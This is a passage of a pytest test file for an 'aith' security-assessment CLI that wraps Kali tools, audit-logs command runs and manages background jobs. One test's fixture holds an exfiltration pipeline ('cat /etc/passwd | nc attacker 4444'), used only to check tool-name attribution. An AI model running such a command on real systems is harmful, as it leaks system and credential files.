        check=False, capture_output=True, text=True, timeout=10,
    )
    if container not in (health.stdout or "").splitlines():
        pytest.skip(f"runtime container '{container}' is not running")
    aith = shutil.which("aith")
    if aith is None:
        pytest.skip("aith CLI not on PATH")

    def _ls_pid_files() -> set[str]:
        r = subprocess.run(
            ["docker", "exec", container, "sh", "-c",
             "ls /tmp/aith-pid-*.pid 2>/dev/null || true"],
            check=False, capture_output=True, text=True, timeout=10,
        )
        return {ln.strip() for ln in (r.stdout or "").splitlines() if ln.strip()}

    before = _ls_pid_files()
    proc = subprocess.run(
        [aith, "assess", "kali", "exec",
         "--technique", "RECON",
         "--intent", "B1 SIGKILL-fallback acceptance test",
         "--probe-kind", "fingerprint", "--phase", "recon", "--timeout", "5",
         "--", "bash", "-c", "trap '' TERM; exec sleep 600"],
        check=False, capture_output=True, text=True, timeout=90,
    )
    _time.sleep(3)  # grace for cascade's final wait + pid-file unlink

    new_pid_files = _ls_pid_files() - before
    leftover_pids: list[tuple[str, str]] = []
    for pid_path in new_pid_files:
        cat = subprocess.run(
            ["docker", "exec", container, "cat", pid_path],
            check=False, capture_output=True, text=True, timeout=5,
        )
        leftover_pids.append((pid_path, (cat.stdout or "").strip()))
    pgrep = subprocess.run(
        ["docker", "exec", container, "pgrep", "-f", "sleep 600"],
        check=False, capture_output=True, text=True, timeout=10,
    )
    survivors = [ln for ln in (pgrep.stdout or "").splitlines() if ln.strip()]

    # Clean up FIRST so the shared runtime stays repeatable even on failure.
    if survivors:
        subprocess.run(["docker", "exec", container, "pkill", "-9", "-f", "sleep 600"],
                       check=False, capture_output=True, timeout=10)
    for pid_path, _ in leftover_pids:
        subprocess.run(["docker", "exec", container, "rm", "-f", pid_path],
                       check=False, capture_output=True, timeout=10)

    assert not survivors, (
        f"SIGTERM-trapping victim survived the cascade — SIGKILL leg broken.\n"
        f"aith stdout: {proc.stdout}\naith stderr: {proc.stderr}\n"
        f"pgrep stdout: {pgrep.stdout}"
    )
    for pid_path, recorded in leftover_pids:
        if not recorded:
            continue
        alive = subprocess.run(
            ["docker", "exec", container, "kill", "-0", recorded],
            check=False, capture_output=True, timeout=5,
        )
        assert alive.returncode != 0, (
            f"pid file {pid_path} still points to live PID {recorded} after timeout"
        )


def test_kali_exec_dedup_warns_and_returns_early_without_force(
    monkeypatch, fake_engagement, capsys
):
    """Default behavior on dedup hit is warn-and-continue.

    The previous semantics (early-return with status=superseded, requiring
    `--force` to bypass) pushed operators toward `--force` as a habit because
    parallel specialists racing on the same wildcard list inside the 30s
    window were hard-blocked. Round 9: the warning is the only behavior;
    block-on-dup mode (KALI_AUDIT_DEDUP_BLOCK) was removed.
    """
    kali = _setup_fake_config(monkeypatch, fake_engagement)

    class _DedupClient(_FakeClient):
        def post(self, endpoint, payload):
            self.posts.append((endpoint, payload))
            return {"id": 9, "superseded_by_id": 8}

    fake_client = _DedupClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)

    popen_called = []

    def _fake_popen(*args, **kwargs):
        popen_called.append(True)
        return _FakePopen(returncode=0)

    monkeypatch.setattr(kali.subprocess, "Popen", _fake_popen)

    result = kali.kali_exec(
        ["nmap", "-p", "22", "10.0.0.1"],
        technique="RECON",
        intent="dup probe",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    err = capsys.readouterr().err
    assert result.status == "completed", (
        "warn-and-continue is the new default; dedup hit must not early-return"
    )
    assert "dedup hit" in err
    assert popen_called, "subprocess must run under warn-and-continue default"


def test_dedup_warns_and_continues_by_default(
    monkeypatch, fake_engagement, capsys
):
    """The dedup warning text lands on stderr but the command runs to completion.

    Sibling of `test_kali_exec_dedup_warns_and_returns_early_without_force`,
    asserting the same default policy with a slightly different shape: this
    one verifies (a) the backend POST returned a NEW row id (not the
    predecessor's), (b) the CLI's finalize PATCH targets that new row, and
    (c) the resulting KaliResult.run_id is the new row's id — distinct from
    the predecessor's. This is the audit-truthfulness assertion for ISSUE-003.
    """
    kali = _setup_fake_config(monkeypatch, fake_engagement)

    PREDECESSOR_ID = 20
    NEW_ROW_ID = 21

    class _DedupClient(_FakeClient):
        def post(self, endpoint, payload):
            self.posts.append((endpoint, payload))
            # Backend always inserts a new row on dedup hit and links it to
            # the predecessor via superseded_by_id. Returned id is the NEW
            # row's id so the CLI's finalize PATCH lands on its own row.
            return {"id": NEW_ROW_ID, "superseded_by_id": PREDECESSOR_ID}

    fake_client = _DedupClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )

    result = kali.kali_exec(
        ["nmap", "-p", "80", "10.0.0.2"],
        technique="RECON",
        intent="parallel-specialist race",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )

    err = capsys.readouterr().err
    assert "dedup hit" in err, "dedup warning must still hit stderr"
    assert f"equivalent command-run id={PREDECESSOR_ID}" in err
    assert result.status == "completed", "subprocess must run despite dedup hit"
    assert result.return_code == 0
    # ISSUE-003 audit-truth assertion: the run_id we report is the NEW row's
    # id, NOT the predecessor's. Two parallel subprocess executions => two
    # rows in the database, even when the second one was a dedup-hit retry.
    assert result.run_id == NEW_ROW_ID, (
        "warn-and-continue must surface the new row id, not the predecessor's"
    )
    assert result.run_id != PREDECESSOR_ID
    # Exactly one pre-exec POST went out, and it was for the new row.
    assert len(fake_client.posts) == 1
    # Finalize PATCH targets the NEW row, not the predecessor — this is the
    # bug the previous implementation had (it patched the predecessor's row,
    # invisibly overwriting the in-flight peer's eventual finalize).
    assert any(
        ep == f"command-runs/{NEW_ROW_ID}" and payload.get("status") == "completed"
        for ep, payload in fake_client.patches
    ), "finalize PATCH must target the new row, not the predecessor"
    assert not any(
        ep == f"command-runs/{PREDECESSOR_ID}" for ep, _ in fake_client.patches
    ), "warn-and-continue must NOT patch the predecessor's row"


def test_dedup_force_does_not_set_superseded_by_id(monkeypatch, fake_engagement, capsys):
    """`--force` is the deliberate-retry escape hatch.

    Two separate guarantees ride on it:
    1. The CLI does NOT emit the dedup warning to stderr (operator opted in).
    2. The backend POST receives ``force=True`` so the new row's
       ``superseded_by_id`` is NOT set — operator declared this is an
       independent retry, not a peer of the in-flight predecessor.
    """
    kali = _setup_fake_config(monkeypatch, fake_engagement)

    captured_payloads: list[dict] = []

    class _ForceClient(_FakeClient):
        def post(self, endpoint, payload):
            captured_payloads.append(payload)
            self.posts.append((endpoint, payload))
            # Mirror the backend's behavior: when force=True the response has
            # superseded_by_id=None even if a predecessor exists.
            sup = None if payload.get("force") else 40
            return {"id": 41, "superseded_by_id": sup}

    fake_client = _ForceClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )

    result = kali.kali_exec(
        ["nmap", "-p", "22", "10.0.0.4"],
        technique="RECON",
        intent="force retry",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        force=True,
        tool_name="nmap",
    )

    assert result.status == "completed"
    err = capsys.readouterr().err
    assert "dedup hit" not in err, (
        "--force must suppress the warning entirely — operator deliberate retry"
    )
    # The CLI sent force=True in the pre-exec POST so the backend skips
    # _find_dedup_predecessor and superseded_by_id stays NULL on the new row.
    assert len(captured_payloads) == 1
    assert captured_payloads[0].get("force") is True, (
        "CLI must propagate --force into the pre-exec POST payload"
    )


def test_kali_exec_dedup_force_bypasses_check(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)

    class _DedupClient(_FakeClient):
        def post(self, endpoint, payload):
            self.posts.append((endpoint, payload))
            return {
                "id": 11,
                "superseded_by_id": 10 if not payload.get("force") else None,
            }

    fake_client = _DedupClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )

    result = kali.kali_exec(
        ["nmap", "-p", "22", "10.0.0.1"],
        technique="RECON",
        intent="dup probe",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        force=True,
        tool_name="nmap",
    )
    assert result.status == "completed"


def _kali_exec_with_technique(monkeypatch, fake_engagement, technique: str):
    """Helper: construct a clean kali_exec call with the requested technique value.

    Returns ``(result, fake_client)``. Used by N10 round-trip tests for the new
    enum members so each test does not duplicate the setup boilerplate.
    """
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )
    result = kali.kali_exec(
        ["echo", "smoke"],
        technique=technique,
        intent=f"{technique.lower()} smoke",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="operator",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="echo",
    )
    return result, fake_client


def test_kali_exec_accepts_meta_technique(monkeypatch, fake_engagement):
    """N10 — `META` is accepted on the kali_exec round-trip (operator-side metadata)."""
    result, fake_client = _kali_exec_with_technique(
        monkeypatch, fake_engagement, "META"
    )
    assert result.status == "completed"
    assert any(payload.get("technique") == "META" for _ep, payload in fake_client.posts)


def test_kali_exec_accepts_health_technique(monkeypatch, fake_engagement):
    """N10 — `HEALTH` is accepted (runtime health smoke / version probes)."""
    result, fake_client = _kali_exec_with_technique(
        monkeypatch, fake_engagement, "HEALTH"
    )
    assert result.status == "completed"
    assert any(
        payload.get("technique") == "HEALTH" for _ep, payload in fake_client.posts
    )


def test_kali_exec_accepts_log_read_technique(monkeypatch, fake_engagement):
    """N10 — `LOG-READ` is accepted (reading existing artifacts/log files)."""
    result, fake_client = _kali_exec_with_technique(
        monkeypatch, fake_engagement, "LOG-READ"
    )
    assert result.status == "completed"
    assert any(
        payload.get("technique") == "LOG-READ" for _ep, payload in fake_client.posts
    )


def test_kali_exec_rejects_unknown_technique(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    monkeypatch.setattr(kali, "AssessmentClient", _FakeClient)
    with pytest.raises(Exception) as exc:
        kali.kali_exec(
            ["which", "apkeep"],
            technique="TOOL-INVENTORY",
            intent="mobile APK tooling inventory",
            probe_kind="baseline",
            phase="code-ingest",
            timeout=60,
            agent_name=None,
            engagement_dir=fake_engagement,
            engagement_key=fake_engagement.name,
        )
    assert "TECHNIQUE_ENUM" in str(exc.value) or "technique" in str(exc.value).lower()


def test_kali_exec_defaults_missing_agent_name_to_operator(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.delenv("AGENT_NAME", raising=False)
    monkeypatch.delenv("AITH_AGENT_NAME", raising=False)
    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(kali.subprocess, "Popen", lambda *_a, **_k: _FakePopen(returncode=0))

    result = kali.kali_exec(
        ["which", "apkeep"],
        technique="HEALTH",
        intent="mobile APK tooling inventory",
        probe_kind="baseline",
        phase="code-ingest",
        timeout=60,
        agent_name=None,
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
    )

    assert result.status == "completed"
    assert fake_client.posts[0][1]["agent_name"] == "operator"


def test_kali_exec_rejects_missing_phase(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    with pytest.raises(Exception) as exc:
        kali.kali_exec(
            ["nmap", "10.0.0.1"],
            technique="RECON",
            intent="probe",
            probe_kind="fingerprint",
            phase="",
            timeout=60,
            agent_name="recon-specialist",
            engagement_dir=fake_engagement,
            engagement_key=fake_engagement.name,
        )
    assert "phase" in str(exc.value).lower()


def test_kali_exec_rejects_intent_too_long(monkeypatch, fake_engagement):
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    with pytest.raises(Exception) as exc:
        kali.kali_exec(
            ["nmap", "10.0.0.1"],
            technique="RECON",
            intent="A" * 250,
            probe_kind="fingerprint",
            phase="recon",
            timeout=60,
            agent_name="recon-specialist",
            engagement_dir=fake_engagement,
            engagement_key=fake_engagement.name,
        )
    assert "intent" in str(exc.value).lower()


def test_kali_exec_audit_post_failure_writes_marker_and_continues(
    monkeypatch, fake_engagement, capsys
):
    kali = _setup_fake_config(monkeypatch, fake_engagement)

    class _BrokenClient(_FakeClient):
        def post(self, endpoint, payload):
            from assess.lib.client import AssessError

            raise AssessError("backend down")

    monkeypatch.setattr(
        kali, "AssessmentClient", lambda *a, **k: _BrokenClient("u", "k")
    )
    monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
    monkeypatch.setattr(
        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
    )

    result = kali.kali_exec(
        ["nmap", "10.0.0.1"],
        technique="RECON",
        intent="probe",
        probe_kind="fingerprint",
        phase="recon",
        timeout=30,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
        tool_name="nmap",
    )
    # Result should still come back even though audit POST failed.
    assert result.status == "completed"
    err = capsys.readouterr().err
    assert "audit POST failed" in err

    # Marker file written under scans/kali/.
    markers = list((fake_engagement / "scans" / "kali").glob("*.failed-audit"))
    assert markers, "expected a .failed-audit marker file"


# ──────────────────────────────────────────────────────────────────────────
# kali job lifecycle (mocked subprocess + client)
# ──────────────────────────────────────────────────────────────────────────


def test_job_start_posts_queued_then_marks_running(monkeypatch, fake_engagement):
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _JobClient(_FakeClient):
        def post(self, endpoint, payload):
            self.posts.append((endpoint, payload))
            self.row = {
                "id": 14,
                "status": "queued",
                "dtach_socket_path": None,
                "stdout_path": None,
                "stderr_path": None,
            }
            return self.row.copy()

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            self.row.update(payload)
            return self.row.copy()

    fake_client = _JobClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_check_dtach_in_container", lambda name: None)
    monkeypatch.setattr(kali_jobs, "_ensure_dtach_dir", lambda name, path: None)

    seen_argv = []

    def fake_run(argv, **kwargs):
        seen_argv.append(argv)
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(kali_jobs.subprocess, "run", fake_run)

    record = kali_jobs.start_job(
        ["nuclei", "-l", "hosts.txt"],
        audit_meta={
            "technique": "RECON",
            "intent": "long sweep",
            "probe_kind": "fingerprint",
            "phase": "recon",
        },
        container_name="security-research",
    )
    assert record["status"] == "running"
    assert "/tmp/aith-jobs/" in record["dtach_socket_path"]
    # POST /jobs landed.
    assert fake_client.posts and fake_client.posts[0][0] == "jobs"
    assert fake_client.posts[0][1]["status"] == "queued"
    # PATCH /jobs/14 first persisted paths before any process is spawned.
    assert fake_client.patches and fake_client.patches[0][0] == "jobs/14"
    assert fake_client.patches[0][1]["dtach_socket_path"].startswith("/tmp/aith-jobs/")
    assert fake_client.patches[0][1]["stdout_path"].endswith(".out")
    assert fake_client.patches[0][1]["stderr_path"].endswith(".err")
    assert "status" not in fake_client.patches[0][1]
    # The final PATCH only transitions the already-manageable row to running.
    assert fake_client.patches[1] == ("jobs/14", {"status": "running"})
    # docker exec -d dtach ... was invoked.
    assert any("dtach" in arg for argv in seen_argv for arg in argv)
    dtach_argv = next(argv for argv in seen_argv if "dtach" in argv)
    assert "-w" in dtach_argv
    assert dtach_argv[dtach_argv.index("-w") + 1] == f"/engagements/{fake_engagement.name}"


def test_job_start_persists_paths_and_cleans_up_when_running_patch_fails(
    monkeypatch, fake_engagement
):
    kali_jobs = _import("assess.lib.kali_jobs")
    from assess.lib.client import AssessError

    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    events: list[tuple[str, object]] = []

    class _FailRunningPatchClient(_FakeClient):
        def post(self, endpoint, payload):
            self.posts.append((endpoint, payload))
            return {"id": 14, "status": "queued"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            events.append(("patch", payload.copy()))
            if payload.get("status") == "running":
                raise AssessError("backend down during running patch")
            return {"id": 14, "status": "queued", **payload}

    fake_client = _FailRunningPatchClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_check_dtach_in_container", lambda name: None)
    monkeypatch.setattr(kali_jobs, "_ensure_dtach_dir", lambda name, path: None)

    cleanup_calls: list[tuple[str, object]] = []
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda container, path: 4242)
    monkeypatch.setattr(
        kali_jobs,
        "_signal_job_pid",
        lambda container, pid, signal_name: cleanup_calls.append(
            ("signal", signal_name, pid)
        ),
    )
    monkeypatch.setattr(
        kali_jobs,
        "_wait_for_pid_exit",
        lambda container, pid, **kwargs: cleanup_calls.append(
            ("wait", kwargs["timeout_seconds"])
        )
        or True,
    )

    def fake_run(argv, **kwargs):
        events.append(("run", list(argv)))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(kali_jobs.subprocess, "run", fake_run)

    with pytest.raises(AssessError, match="backend down during running patch"):
        kali_jobs.start_job(
            ["nuclei", "-l", "hosts.txt"],
            audit_meta={
                "technique": "RECON",
                "intent": "long sweep",
                "probe_kind": "fingerprint",
                "phase": "recon",
            },
            container_name="security-research",
        )

    first_patch = events[0]
    assert first_patch[0] == "patch"
    assert first_patch[1]["dtach_socket_path"].startswith("/tmp/aith-jobs/")
    assert first_patch[1]["stdout_path"].endswith(".out")
    assert first_patch[1]["stderr_path"].endswith(".err")
    assert first_patch[1].get("status") != "running"
    assert events[1][0] == "run"
    assert events[2] == ("patch", {"status": "running"})
    assert cleanup_calls[0] == ("signal", "TERM", 4242)


def test_job_stop_patches_killed(monkeypatch, fake_engagement):
    kali_jobs = _import("assess.lib.kali_jobs")
    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 22, "dtach_socket_path": "/tmp/aith-jobs/abc.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 22, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: 4343)
    monkeypatch.setattr(kali_jobs, "_signal_job_pid", lambda *a, **k: None)
    monkeypatch.setattr(kali_jobs, "_wait_for_pid_exit", lambda *a, **k: True)
    monkeypatch.setattr(
        kali_jobs.subprocess,
        "run",
        lambda *a, **k: SimpleNamespace(returncode=0, stdout="", stderr=""),
    )

    record = kali_jobs.job_stop(22, container_name="security-research")
    assert record["status"] == "killed"
    assert fake_client.patches[0] == ("jobs/22", {"status": "killed"})


def test_job_stop_rejects_already_terminal_job(monkeypatch, fake_engagement):
    kali_jobs = _import("assess.lib.kali_jobs")
    from assess.lib.client import AssessError

    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 22, "status": "completed", "dtach_socket_path": "/tmp/aith-jobs/abc.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 22, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)

    signals: list[tuple] = []
    monkeypatch.setattr(kali_jobs, "_signal_job_pid", lambda *args, **kwargs: signals.append(args))

    with pytest.raises(AssessError, match="already terminal"):
        kali_jobs.job_stop(22, container_name="security-research")

    assert fake_client.patches == []
    assert signals == []


def test_job_stop_records_stop_failed_when_pid_missing(monkeypatch, fake_engagement):
    kali_jobs = _import("assess.lib.kali_jobs")
    from assess.lib.client import AssessError

    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 25, "dtach_socket_path": "/tmp/aith-jobs/missing-pid.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 25, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: True)
    monkeypatch.setattr(kali_jobs, "_read_job_pid", lambda *a, **k: None)

    dtach_interrupts: list[list[str]] = []

    def fake_run(argv, **kwargs):
        dtach_interrupts.append(list(argv))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(kali_jobs.subprocess, "run", fake_run)

    with pytest.raises(AssessError, match="PID.*not available"):
        kali_jobs.job_stop(25, container_name="security-research")

    assert dtach_interrupts
    assert ("jobs/25", {"status": "stop_failed"}) in fake_client.patches


def test_job_stop_records_lost_when_container_not_running(monkeypatch, fake_engagement):
    kali_jobs = _import("assess.lib.kali_jobs")

    monkeypatch.setattr(
        kali_jobs,
        "load_config",
        lambda flag: SimpleNamespace(
            base_url="http://127.0.0.1:18000",
            engagement_dir=str(fake_engagement),
            engagement_key=fake_engagement.name,
            agent_root=str(fake_engagement.parent.parent),
        ),
    )

    class _StopClient(_FakeClient):
        def get(self, endpoint):
            return {"id": 26, "dtach_socket_path": "/tmp/aith-jobs/gone.sock"}

        def patch(self, endpoint, payload, *, accept_409: bool = False):
            self.patches.append((endpoint, payload))
            return {"id": 26, "status": payload["status"]}

    fake_client = _StopClient("http://127.0.0.1:18000", fake_engagement.name)
    monkeypatch.setattr(kali_jobs, "AssessmentClient", lambda *a, **k: fake_client)
    monkeypatch.setattr(kali_jobs, "_container_running", lambda name: False)

    record = kali_jobs.job_stop(26, container_name="security-research")

    assert record["status"] == "lost"
    assert fake_client.patches == [("jobs/26", {"status": "lost"})]


# ──────────────────────────────────────────────────────────────────────────
# Contract command + smoke tests
# ──────────────────────────────────────────────────────────────────────────


def test_contract_kali_root_lists_verbs():
    contracts = _import("assess.lib.contracts")
    rendered = contracts.render_contract("kali")
    assert "nmap-scan" in rendered
    assert "nuclei" in rendered
    assert "asnmap" in rendered
    assert "--phase" in rendered


def test_contract_kali_per_verb_renders_examples():
    contracts = _import("assess.lib.contracts")
    rendered = contracts.render_contract("kali nmap-scan")
    assert "nmap-scan" in rendered
    assert "Examples" in rendered
    assert "--technique" in rendered


def test_contract_kali_asnmap_is_registered():
    contracts = _import("assess.lib.contracts")
    rendered = contracts.render_contract("kali asnmap")
    assert "kali asnmap" in rendered
    assert "aith assess kali asnmap" in rendered


def test_contract_kali_exec_does_not_advertise_removed_strace():
    contracts = _import("assess.lib.contracts")
    rendered = contracts.render_contract("kali exec")
    assert "--strace" not in rendered
    assert "-- <command...>" in rendered


def test_contract_command_supports_two_arg_form(capsys):
    cli = _import("assess.cli")
    cli.main(["contract", "kali", "nmap-scan"])
    out = capsys.readouterr().out
    assert "kali nmap-scan" in out
    assert "Notes" in out


def test_kali_exec_noop_short_circuit_keeps_argparse_smoke_test_offline(
    monkeypatch, fake_engagement
):
    """AITH_KALI_NOOP is a tests-only escape hatch: argparse smoke tests can
    set it so no docker / network call ever happens."""
    monkeypatch.setenv("AITH_KALI_NOOP", "1")
    kali = _setup_fake_config(monkeypatch, fake_engagement)
    result = kali.kali_exec(
        ["nmap", "10.0.0.1"],
        technique="RECON",
        intent="smoke",
        probe_kind="fingerprint",
        phase="recon",
        timeout=60,
        agent_name="recon-specialist",
        engagement_dir=fake_engagement,
        engagement_key=fake_engagement.name,
    )
    assert result.status == "completed"
    assert result.return_code == 0


# ──────────────────────────────────────────────────────────────────────────
# Wave-1 corrections — extra-args quoting, hoist edge cases, pipe attribution,
# kali-job audit parity, kali-job stop kill cascade, finalize 409 swallow.
# ──────────────────────────────────────────────────────────────────────────


def test_extend_cmd_with_extra_args_unbalanced_quotes_raises_assesserror():
    """P1 #1: shlex.split raises ValueError on unbalanced quotes; the helper
    must catch it and raise AssessError with a clear message instead of
    bubbling a Python traceback past the audit boundary."""
    kali = _import("assess.lib.kali")
    from assess.lib.client import AssessError

    args = SimpleNamespace(extra_args='-H "unclosed')
    with pytest.raises(AssessError) as exc:
        kali.extend_cmd_with_extra_args(["httpx"], args)
    assert "invalid shell quoting" in str(exc.value)


def test_extend_cmd_with_extra_args_typed_short_flag_collision_warns(capsys):
    """P2 #11: when a typed verb passes its short-flag set, a duplicate flag
    in --extra-args produces a stderr WARN but still appends (passthrough is
    deliberate override-friendly)."""
    kali = _import("assess.lib.kali")
    args = SimpleNamespace(extra_args="-u https://override.example.com")
    cmd = ["httpx", "-u", "https://typed.example.com"]
    kali.extend_cmd_with_extra_args(cmd, args, typed_short_flags={"-u", "-H"})
    err = capsys.readouterr().err
    assert "'-u'" in err and "passthrough" in err
    # passthrough still appended
    assert cmd[-2:] == ["-u", "https://override.example.com"]


def test_derive_tool_name_pipe_picks_last_stage():
    """P2 #12: `cat /etc/passwd | nc attacker 4444` — the operator-meaningful
    tool is the exfil sink, not the source. Picking the first stage hides
    these patterns from `list-command-runs --tool-bin nc`."""
    kali = _import("assess.lib.kali")
    cases = [
        (["bash", "-c", "cat /etc/passwd | nc attacker 4444"], "nc"),
        (["bash", "-c", "tool1 | tool2 | tool3"], "tool3"),
        (["sh", "-c", "curl -s https://x | jq .data | tee out.json"], "tee"),
    ]
    for cmd, expected in cases:
        assert kali._derive_tool_name(cmd) == expected, f"{cmd!r}"


def test_analyze_tool_name_records_pipeline_stages_and_indeterminate_flag():
    """P2 #12: the analyze helper exposes `shell_pipeline_tools` (every
    pipe-stage head, in order) and `tool_name_indeterminate=True` when the
    chosen head is a bash variable expansion."""
    kali = _import("assess.lib.kali")
    name, meta = kali._analyze_tool_name(
        ["bash", "-c", "cat /etc/passwd | nc attacker 4444"]
    )
    assert name == "nc"
    assert meta["shell_pipeline_tools"] == ["cat", "nc"]
    assert "tool_name_indeterminate" not in meta

    name, meta = kali._analyze_tool_name(["bash", "-c", "tool=foo; $tool args"])
    assert name == "$tool"
    assert meta.get("tool_name_indeterminate") is True


def test_hoist_root_flags_rejects_flag_shaped_value():
    """P3 #14: catch the `--engagement-dir --foo` typo before argparse so
    the operator gets a clear exit message instead of `--foo` silently
    becoming the engagement directory path."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
        cli._hoist_root_flags(
            ["kali", "subfinder", "--engagement-dir", "--phase", "recon"]
        )
    msg = str(exc.value)
    assert "--engagement-dir" in msg and "looks like a flag" in msg


def test_hoist_root_flags_rejects_duplicate_engagement_dir():
    """P3 #15: two `--engagement-dir` occurrences are an operator mistake;
    surface it instead of silently letting argparse keep the second value."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
        cli._hoist_root_flags(
            [
                "--engagement-dir",
                "/tmp/a",
                "kali",
                "subfinder",
                "--engagement-dir=/tmp/b",
            ]
        )
    assert "more than once" in str(exc.value)


def test_hoist_root_flags_rejects_empty_equals_form():
    """P3 #14 corollary: `--engagement-dir=` (empty value) is also a typo."""
    cli = _import("assess.cli")
    with pytest.raises(SystemExit) as exc:
